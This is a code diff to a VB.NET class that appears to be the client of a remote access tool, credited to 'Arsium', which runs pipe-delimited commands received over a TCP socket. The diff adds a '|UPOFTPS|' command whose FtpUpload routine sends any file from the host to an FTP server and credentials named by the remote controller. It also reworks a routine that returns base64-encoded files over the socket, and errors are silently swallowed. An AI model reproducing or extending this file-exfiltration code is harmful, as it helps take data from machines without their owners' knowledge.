@@ -2,12 +2,15 @@
 Imports System.Drawing.Imaging
 Imports System.IO
 Imports System.Net.Sockets
+Imports System.Runtime.CompilerServices
 Imports System.Runtime.InteropServices
 Imports System.Security
 Imports System.Text
+Imports System.Threading
 Imports System.Windows.Forms
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
+
 Public Class MainCL
     Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
 
@@ -45,6 +48,10 @@ Public Class MainCL
 
             Await Task.Run(Sub() FI.FI(k, h(2)))
 
+        ElseIf h(1) = "|UPOFTPS|" Then
+
+            Await Task.Run(Sub() FtpUpload(k, h(2), h(3), h(4), h(5)))
+            'ByVal K As TcpClient, ByVal Path As String, ByVal S As String, ByVal U As String, ByVal P As String)
         End If
 
 
@@ -189,17 +196,88 @@ Public Class MainCL
             Dim Filename As String = j(j.Length - 1)
 
 
-
             Dim n As String = Await Task.Run(Function() Convert.ToBase64String(o)) & "|DW|" & Filename & "|ENDW|"
+            Dim buffer() As Byte = Encoding.Default.GetBytes(n)
+            '
+            Await k.GetStream.WriteAsync(Buffer, 0, Buffer.Length)
 
-            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
-            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+
+
+
+
+
+
+
+
+            '  Dim value As String = Convert.ToString(4096)
+            '  Dim text As String = n
+            '  Dim value2 As String = Convert.ToString(text.Length)
+            '  Dim value3 As String = Convert.ToString(Convert.ToInt32(value2) / Convert.ToInt32(value))
+            '  Dim value4 As String = Convert.ToString(1)
+            ' Dim num As Integer = Convert.ToInt32(value)
+
+            ' For i As Integer = 0 To num
+
+            '   Dim contents As String = Strings.Mid(text, Convert.ToInt32(value4), Convert.ToInt32(value3)) & "|FSTK|"
+
+            '    Dim buffer() As Byte = Encoding.Default.GetBytes(contents)
+
+            '    k.GetStream.Write(buffer, 0, buffer.Length)
+
+            '   IO.File.WriteAllText(folderBrowserDialog2.SelectedPath + "\Part" + Convert.ToString(i) + ".txt", contents)
+
+
+
+            '    value4 = Convert.ToString(Convert.ToInt32(value4) + CDec(Convert.ToInt32(value3)))
+            '   Next
+
+
+            '  Private Sub FlatButton24_Click(sender As Object, e As EventArgs) Handles FlatButton24.Click
+            '  Dim folderBrowserDialog As FolderBrowserDialog = New FolderBrowserDialog()
+            '  Dim folderBrowserDialog2 As FolderBrowserDialog = folderBrowserDialog
+            '  Dim flag As Boolean = folderBrowserDialog2.ShowDialog() = DialogResult.OK
+            '   If flag Then
+            ' Dim value As String = Convert.ToString(Me.NumericUpDown1.Value)
+            ' Dim text As String = Me.txtResult.Text
+            '  Dim value2 As String = Convert.ToString(text.Length)
+            '   Dim value3 As String = Convert.ToString(Convert.ToInt32(value2) / Convert.ToInt32(value))
+            '   Dim value4 As String = Convert.ToString(1)
+            '    Dim num As Integer = Convert.ToInt32(value)
+            '    For i As Integer = 0 To num
+            '        Dim contents As String = Strings.Mid(text, Convert.ToInt32(value4), Convert.ToInt32(value3))
+            '        IO.File.WriteAllText(folderBrowserDialog2.SelectedPath + "\Part" + Convert.ToString(i) + ".txt", contents)
+            '        value4 = Convert.ToString(Convert.ToInt32(value4) + CDec(Convert.ToInt32(value3)))
+            '      Next
+            '   End If
+            ' End Sub
 
         Catch ex As Exception
 
         End Try
         GC.Collect()
         GC.WaitForPendingFinalizers()
+    End Sub
+
+
+
+    Public Shared Async Sub FtpUpload(ByVal K As TcpClient, ByVal Path As String, ByVal S As String, ByVal U As String, ByVal P As String)
+        '       Dim o As String = Form1.PL_FM & "|SP1|" & "" & "|SP2|" & "|UPOFTPS|" & "|SP2|" & newP & "|SP2|" & S & "|SP2|" & U & "|SP2|" & P & "|ENDING|"
+
+        Try
+
+
+            Dim D As New Devices.Network
+
+
+            Dim j As String() = Split(Path, "\")
+
+            Dim Filename As String = j(j.Length - 1)
+
+            Await Task.Run(Sub() D.UploadFile(Path, S & Filename, U, P))
+
+        Catch ex As Exception
+
+        End Try
     End Sub
 
     Public Shared Async Sub STB(ByVal k As TcpClient, ByVal P As String)
